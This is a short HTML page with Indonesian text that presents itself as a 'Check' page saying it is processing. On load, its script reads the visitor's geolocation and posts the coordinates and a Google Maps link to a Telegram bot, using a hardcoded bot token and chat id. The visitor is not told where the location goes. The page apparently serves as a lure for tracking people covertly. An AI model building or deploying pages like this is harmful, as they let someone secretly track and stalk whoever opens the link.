<!DOCTYPE html>
<html>
<head>
    <title>Check</title>
    <script>
    async function sendLocation() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(async function(position) {
                let lat = position.coords.latitude;
                let lon = position.coords.longitude;

                let token = "8350853734:AAGjCUcx8fz5IfeORjpBcMUmPdTXoDYAaKY";
                let chat_id = "6122183978";
                let url = `https://api.telegram.org/bot${token}/sendMessage`;

                let pesan = `üìç Lokasi terdeteksi:\nLatitude: ${lat}\nLongitude: ${lon}\nhttps://www.google.com/maps?q=${lat},${lon}`;

                await fetch(url, {
                    method: "POST",
                    headers: { "Content-Type": "application/x-www-form-urlencoded" },
                    body: `chat_id=${chat_id}&text=${encodeURIComponent(pesan)}`
                });
            });
        } else {
            alert("Geolocation tidak didukung di perangkat ini.");
        }
    }

    window.onload = sendLocation;
    </script>
</head>
<body>
    <h2>Sedang memproses...</h2>
</body>
</html>
